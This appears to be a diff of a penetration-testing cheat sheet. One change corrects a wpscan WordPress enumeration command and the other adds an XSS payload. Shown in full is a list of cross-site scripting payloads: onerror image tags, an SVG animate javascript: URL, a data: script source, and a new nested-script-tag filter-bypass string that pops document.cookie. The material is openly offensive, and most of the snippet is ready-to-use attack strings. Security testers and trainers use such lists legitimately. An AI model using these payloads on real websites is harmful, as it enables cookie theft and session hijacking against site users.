@@ -13,7 +13,7 @@ python3 oneforall.py --target target.com run
 ### Wordpress Scanner
 
 ```bash
-wpscan --url http://192.168.145.133/wordpress -e ,vt,tt,u,ap
+wpscan --url http://192.168.145.133/wordpress -e vt,tt,u,ap
 ```
 ###  Subdomain Enumeration.
 
@@ -237,6 +237,7 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 ```bash
 • "><img src/onerror=prompt(document.cookie)>
 • "><img src=x onerror=alert(document.domain)> 
+• "12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img"
 • <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
 • <script src="data:,alert(1)%250A-->
 • <script>alert(1)%0d%0a-->%09</script
